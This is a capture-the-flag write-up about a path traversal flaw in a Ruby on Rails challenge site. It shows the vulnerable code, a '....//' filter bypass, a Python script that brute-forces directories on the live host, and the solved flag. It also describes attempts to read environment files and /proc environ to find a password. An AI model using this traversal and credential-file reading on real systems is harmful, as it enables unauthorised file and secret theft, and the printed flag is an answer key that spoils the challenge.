---
title: Ascenda CTF Challenge
hidden: true
# category: ctf
# tags:
#     - web
#     - path-traversal
---

I got the opportunity to participate in the Ascenda CTF Challenge after applying for the Internship program.

**Note**: This write-up is not public yet, only people with the shared link can view it.

# Problem Overview

The website is built using Ruby on Rails and is hosted on Fly.io: [problem](https://hello-anya.fly.dev/). The challenge is to find the flag from the given website. 

# Solution

## Analyzing the Application

Some of the key points should be noted to analyze the application:

- `config/routes.rb`: This file contains the routing configuration for the application. It maps the URL to the controllers stored in the `app/controllers` directory.
  - `\` is mapped to `pages#index` which means the root URL will be handled by the `index` action of the `PagesController`.
  - `\user_sessions` and `\users` are used for user authentication and retrieval of user information.
  - These actions also are used to replace data in the `*.html.erb` file to render the pages.

After understading 3 controllers, I found that `PagesController` render the image `anya/anya.png` if `:img` parameter is not provided, otherwise it will render the image specified in the `:img` parameter.

```rb
image = (anya_path + params.fetch(:img, 'anya.png')).gsub("../", "")
file = File.open(image)
@img = Base64.encode64(file.read)
```

## Exploiting the Vulnerability

The vulnerability is in the `image` variable which allows attacker can read any file (Path Traversal) by providing the `:img` parameter. However, the `../`, used for changing the directory, is replaced with empty string, so we need to bypass this filter by using `....//` which will be converted to `../` by `gsub` method.

## Building the payload 

In the `README.md`, the flag is stored in the `secret_file` which is not included in the source code provided. 

In `config/initializers/assets.rb`, the `secret_file` is placed in a random directory inside the source code. So the format payload will be `....//<directory>/secret_file` which is passed to the `:img` parameter. (e.g `"https://hello-anya.fly.dev/?img=....//abc/secret_file"`)

So I wrote a Python script to bruteforce the directory for the `secret_file`. This script should placed in the root directory of the source code to get all the possible directories.

```python
import os, requests

directory = '.'
subdirectories = [x[0][2:] + '/' for x in os.walk(directory)]

url = "https://hello-anya.fly.dev/?img=....//"
filename = "secret_file"

print(subdirectories)
for subdirectory in subdirectories:
    full_url = url + subdirectory + filename
    print(full_url)

    a = requests.get(url=full_url)
    content = a.text

    # Skip if the file is not found by using a part of `anya.png` image to check
    if "/k57MlgYhmcBYKpNXxo1IwA=" in content:
        print("Not found")
        continue
    
    with open("response_" + full_url.replace('/', '_') + filename + ".html", 'w') as file:
        file.write(a.text)

    print("Response saved as 'response.html'")
```

After running the script, I found the `secret_file` in the  `app` and `test` directories. Get the base64 encoded flag from the response: `MTliZWRiZTY4MWM4MDgyYjNhNTBhMmFjNDQ2NmU2NjJlMzU4ZjRiMTQ0NDAwZjNhNjY4ZWJlZDNmNzVjZjhhNw==`

## Result

**The flag** is `19bedbe681c8082b3a50a2ac4466e662e358f4b144400f3a668ebed3f75cf8a7`

# Extra Discussion (!!)

Take a closer look at the source code, I found there is a special user `anya`. When logging in as `anya`, the `app/views/layouts/_header.html.erb` will include a secret page in the header. Additionally, the password of `anya` is set in `db/seeds.rb` by hasing the raw password from environment variable `ANYA_PASSWORD`. So I modified the above script to bruteforce all environment files of the system, user and also in `/proc/$ID/environ` but I couldn't find the `ANYA_PASSWORD` environment variable. So I couldn't login as `anya` to get the secret page. 

However, I also found that the route `pages/anya` is not configured in `routes.rb` so that might be a bit confusing for me.
